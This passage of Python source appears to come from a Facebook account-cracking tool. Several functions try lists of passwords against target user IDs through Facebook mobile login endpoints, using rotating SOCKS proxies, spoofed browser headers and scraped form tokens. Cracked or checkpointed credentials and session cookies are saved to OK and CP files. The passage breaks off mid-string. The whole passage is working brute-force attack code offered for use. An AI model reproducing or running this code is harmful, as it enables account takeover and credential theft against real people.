	prog.update(des,description=f"[bold purple]Validate V1[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=630498417018811&kid_directed_site=0&app_id=630498417018811&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyzz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyzz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyzz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Validate V2[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def validate3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Validate V3[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='ARIP-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METHOD REGULER ]--------------------#
def reguler1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Reguler V1[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def reguler2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Reguler V2[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbho